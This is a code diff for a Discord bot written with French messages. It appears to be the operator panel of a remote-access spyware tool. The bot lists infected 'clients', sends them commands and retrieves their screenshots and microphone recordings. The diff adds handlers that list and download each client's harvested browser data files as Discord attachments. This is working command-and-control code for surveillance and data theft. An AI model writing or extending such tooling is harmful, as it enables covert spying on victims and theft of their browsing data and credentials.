@@ -13,10 +13,8 @@ import { executeRequestWithTokenRefresh, refreshTokenIfNeeded } from "./utils/to
 import {
     handleClientsCommand,
     handleHelpCommand,
-    handleListAllScreenshotsCommand,
-    handleListAllMicrophonesCommand,
-    handleListBrowserDataCommand,
-    handleSendCommand, handleMicrophoneCommand
+    handleListDataCommand,
+    handleSendCommand
 } from "./utils/handleCommands.js";
 
 const { TOKEN, API_BASE_URL } = config;
@@ -38,24 +36,15 @@ client.on('interactionCreate', async interaction => {
             case 'command':
                 await handleSendCommand(interaction);
                 break;
-            case 'microphone':
-                await handleMicrophoneCommand(interaction);
+            case 'listdata':
+                await handleListDataCommand(interaction);
                 break;
             case 'clients':
                 await handleClientsCommand(interaction);
                 break;
-            case 'listallscreenshots':
-                await handleListAllScreenshotsCommand(interaction);
-                break;
-            case 'listallmicrophones':
-                await handleListAllMicrophonesCommand(interaction);
-                break;
-            case 'listbrowserdata':
-                await handleListBrowserDataCommand(interaction);
-                break;
         }
     } else if (interaction.isButton()) {
-        const [type, clientId] = interaction.customId.split('_');
+        const [type, clientId, browser] = interaction.customId.split('_');
         switch (type) {
             case 'screenshot':
                 try {
@@ -113,6 +102,35 @@ client.on('interactionCreate', async interaction => {
                     await interaction.update({ content: "Erreur lors de la récupération des enregistrements audio." });
                 }
                 break;
+            case 'browserdata':
+                try {
+                    const response = await executeRequestWithTokenRefresh(`${API_BASE_URL}/browser/client/${clientId}/${browser}`);
+                    const browserData = response.data;
+                    if (browserData.length === 0) {
+                        await interaction.update("Aucune donnée de navigation disponible pour ce client.");
+                        return;
+                    }
+
+                    const options = browserData.map(data => ({
+                        label: data.file_path.split('/').pop(),
+                        description: `Le ${data.date_created}`,
+                        value: `${data.id}_${data.file_path.split('/').pop()}`,
+                    }));
+
+                    const selectMenu = new StringSelectMenuBuilder()
+                        .setCustomId("select_browserdata")
+                        .setPlaceholder("Sélectionnez une donnée de navigation")
+                        .addOptions(options.slice(0, 25));
+
+                    const row = new ActionRowBuilder().addComponents(selectMenu);
+
+                    await interaction.update({ content: "Sélectionnez une donnée de navigation :", components: [row] });
+
+                } catch (error) {
+                    console.error("Erreur lors de la récupération des données de navigation", error);
+                    await interaction.update({ content: "Erreur lors de la récupération des données de navigation." });
+                }
+                break;
         }
     } else if (interaction.customId === "select_screenshot") {
         const screenshotId = interaction.values[0];
@@ -159,6 +177,17 @@ client.on('interactionCreate', async interaction => {
                 content: "Erreur lors de la récupération du fichier audio.",
                 components: [],
             });
+        }
+    }else if (interaction.customId === "select_browserdata") {
+        const [browserDataId, filename] = interaction.values[0].split('_');
+        try {
+            const responseFile = await executeRequestWithTokenRefresh(`${API_BASE_URL}/browser/data/${browserDataId}`, { responseType: 'text' });
+            const file = [new AttachmentBuilder(Buffer.from(responseFile.data, 'utf-8'), { name: filename })];
+            await interaction.update({ content: "Voici le fichier de données de navigation :", files: file, components: [] });
+
+        } catch (error) {
+            console.error("Erreur lors de la récupération des données de navigation", error);
+            await interaction.update({ content: "Erreur lors de la récupération des données de navigation." });
         }
     }
 
